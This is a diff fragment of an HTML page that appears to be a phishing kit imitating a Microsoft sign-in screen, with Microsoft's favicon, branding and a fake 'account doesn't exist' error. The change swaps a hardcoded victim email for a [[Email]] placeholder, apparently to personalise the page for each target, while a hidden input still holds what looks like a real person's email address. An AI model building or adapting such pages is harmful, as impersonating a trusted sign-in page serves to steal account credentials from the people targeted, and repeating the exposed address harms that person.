@@ -97,7 +97,7 @@
                     <!-- ////////////////////////div1 start/////////////////////// -->
                     <div class="m-5 p-5 bg-white box" id="div1">
                         <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
-                        <span class="h5">hickorybnr@hotmail.com</span><br>
+                        <span class="h5">[[Email]]</span><br>
                         <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
                         <div class="form-group mt-2">
                             <input type="hidden" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" value="hickorybnr@hotmail.com" style="border-right: none;border-left: none;border-top: none;">
